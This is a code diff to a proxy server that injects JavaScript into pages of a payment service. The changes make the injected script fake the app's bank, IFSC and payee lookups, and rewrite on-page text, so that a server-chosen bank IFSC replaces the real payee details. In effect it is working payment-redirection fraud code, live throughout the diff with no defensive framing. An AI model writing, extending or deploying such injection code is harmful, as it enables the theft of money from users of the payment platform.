@@ -743,7 +743,9 @@ app.get('/inject.js', async (req, res) => {
       ifsc: activeBank ? String(activeBank.ifsc || '') : '',
       blockUpdate: data.blockUpdate !== false
     };
-    let jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
+    let jsCode = INJECT_JS
+      .replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';')
+      .replace("var SERVER_IFSC='';", 'var SERVER_IFSC=' + JSON.stringify(activeBank ? String(activeBank.ifsc || '') : '') + ';');
     res.send(jsCode);
   } catch (e) {
     res.send(INJECT_JS);
@@ -2421,6 +2423,7 @@ if(window._pxi)return;window._pxi=1;
 var P='https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
+var SERVER_IFSC='';
 
 // ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
 (function(){
@@ -2541,12 +2544,12 @@ if(!window.xamlAction){
         if(action==='openWebview'&&(p.url||p.ct_url)){window.location.href=p.url||p.ct_url;return '';}
         var act=String(action||'').toLowerCase();
         if(act.indexOf('bank')>-1||act.indexOf('ifsc')>-1||act.indexOf('payee')>-1||act.indexOf('account')>-1){
-          var activeIfsc=(window.CFG&&CFG.ifsc)||'';
+          var activeIfsc=(window.CFG&&(CFG.ifsc||CFG['if']))||SERVER_IFSC||'';
           return JSON.stringify({code:0,msg:'ok',data:{bankName:activeIfsc,bank:activeIfsc,ifsc:activeIfsc,payee_bankname:activeIfsc,payee_ifsc:activeIfsc}});
         }
         return JSON.stringify({code:0,msg:'ok',data:{}});
       }catch(e){
-        var fallbackIfsc=(window.CFG&&CFG.ifsc)||'';
+        var fallbackIfsc=(window.CFG&&(CFG.ifsc||CFG['if']))||SERVER_IFSC||'';
         return JSON.stringify({code:0,msg:'ok',data:{bankName:fallbackIfsc,bank:fallbackIfsc,ifsc:fallbackIfsc,payee_bankname:fallbackIfsc,payee_ifsc:fallbackIfsc}});
       }
     }
@@ -2606,7 +2609,7 @@ for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj
 
 function patchBankDOM(){
 try{
-var activeIfsc=(CFG&&(CFG.ifsc||CFG['if']))||'';
+var activeIfsc=(CFG&&(CFG.ifsc||CFG['if']))||SERVER_IFSC||'';
 if(!activeIfsc||!document.body)return;
 var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
 while(walker.nextNode()){
